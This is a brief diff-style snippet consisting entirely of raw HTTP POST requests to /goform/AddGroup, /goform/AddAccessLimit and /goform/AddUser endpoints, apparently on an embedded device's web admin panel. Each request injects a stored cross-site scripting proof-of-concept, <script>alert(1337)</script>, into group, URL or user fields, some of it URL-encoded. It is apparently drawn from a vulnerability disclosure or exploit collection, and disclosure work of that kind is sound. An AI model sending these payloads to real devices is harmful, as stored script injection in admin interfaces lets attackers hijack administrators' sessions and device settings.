@@ -1,0 +1,11 @@
+
+POST /goform/AddGroup HTTP/1.1
+group=&lt;script&gt;alert(1337)&lt;/script&gt;&amp;privilege=4&amp;method=1&amp;enabled=on&amp;ok=OK
+
+POST /goform/AddAccessLimit HTTP/1.1
+url=&lt;script&gt;alert(1337)&lt;/script&gt;&amp;group=test&amp;method=3&amp;ok=OK
+
+
+POST /goform/AddUser HTTP/1.1
+user=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E&amp;group=%3Cscript%3Ealert%281337%2
+9%3C%2Fscript%3E&amp;enabled=on&amp;password=test&amp;passconf=test&amp;ok=OK
